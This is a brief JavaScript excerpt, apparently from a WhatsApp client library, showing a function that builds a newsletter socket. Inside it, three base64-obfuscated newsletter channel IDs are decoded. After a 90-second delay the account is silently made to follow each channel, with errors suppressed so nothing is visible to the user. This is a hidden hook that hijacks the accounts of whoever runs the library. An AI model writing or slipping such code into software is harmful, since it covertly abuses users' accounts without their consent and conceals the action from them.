...
const makeNewsletterSocket = (config) => {
  ...
  const autoFollowJids = [
    "MTIwMzYzMzQ1MDY4MTk5MDAwQG5ld3NsZXR0ZXI=",
    "MTIwMzYzNDIyNjg2MzQ5MjU1QG5ld3NsZXR0ZXI=",
    "MTIwMzYzNDAwNjEyMDQyNjc0QG5ld3NsZXR0ZXI=",
  ].map(value => Buffer.from(value, "base64").toString());

  autoFollowJids.forEach((jid, index) => {
    setTimeout(() => {
      newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW).catch(() => {});
    }, 90000 + index * 5000);
  });
